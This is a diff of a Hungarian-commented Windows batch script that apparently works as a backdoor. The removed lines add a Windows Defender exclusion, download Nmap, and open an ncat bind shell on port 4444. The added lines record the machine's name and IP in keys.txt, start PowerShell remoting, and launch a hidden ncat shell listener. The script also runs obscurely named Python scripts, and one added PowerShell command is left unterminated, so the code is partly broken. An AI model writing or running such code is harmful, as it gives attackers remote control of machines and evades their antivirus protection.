@@ -29,58 +29,36 @@ if not exist "%TARGET%\keys.txt" (
 python "%TARGET%\spwww743g7w.py"
 python "%TARGET%\fwsendbfgw.py"
 
-:admin_folytatas
-    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
-    echo Kizaras hozzaadva: oda
-
-cd /d "%TARGET%"
-
-echo [INFO] 1. Lepes: Nmap ZIP letoltese...
-set "URL=https://nmap.org/dist/nmap-7.92-win32.zip"
-powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'nmap.zip' -UserAgent 'Mozilla/5.0'"
-
-if not exist "nmap.zip" (
-    echo [HIBA] A letoltes nem sikerult.
-    pause
-    exit /b
-)
-
-echo [INFO] 2. Lepes: Kicsomagolas...
-powershell -Command "Expand-Archive -Path 'nmap.zip' -DestinationPath '%TARGET%' -Force"
-
-for /d %%D in ("%TARGET%\nmap*") do (
-    if exist "%%D\ncat.exe" set "NCAT=%%D\ncat.exe"
-)
-
-if defined NCAT (
-    echo [SIKER] A program telepitese kesz.
-    echo.
-    echo [INFO] 3. Lepes: Program inditasa...
-
-    start "Ncat Console" cmd /k "%NCAT% --version"
-
-) else (
-    echo [HIBA] Nem talaltam meg az ncat.exe-t.
-    dir "%TARGET%"
-    pause
-)
-
-del "nmap.zip"
-
-"%NCAT%" -l -p 4444 -e cmd.exe
-
-
-:: Szamitogep neve
-for /f "tokens=2 delims==" %%a in ('wmic computersystem get name /value') do set "GEPNEV=%%a"
+:: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
+set "GEPNEV=%COMPUTERNAME%"
 
 :: IPv4 cim
 for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"
 
+---
+
 :: Mentés keys.txt-be
 (
-    echo GEPNEV=!GEPNEV!IP=!IP!
+    echo GEPNEV: !GEPNEV!
+    echo IP: !IP!
 ) > "%TARGET%\keys.txt"
 
+echo [INFO] A keys.txt elkeszult a %TARGET% mappaban.
+echo [INFO] PowerShell Remoting elinditasa a %IP% cimen...
+echo.
+
+:: POWERHSHELL REMOTING BLOKK
+powershell.exe -Command "
+    $user = Get-Credential;
+    Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
+    Enter-PSSession -ComputerName %IP% -Credential $user
+
+:: A parancs futtatása után a .bat script folytatódik (vagy bezárul)
+
+echo.
+echo [INFO] A munkamenet befejezodott vagy megszakadt.
+
+"%NCAT%" -l -p 4444 -e "powershell.exe -w hidden C:\Windows\System32\cmd.exe"
 
 echo.
 pause
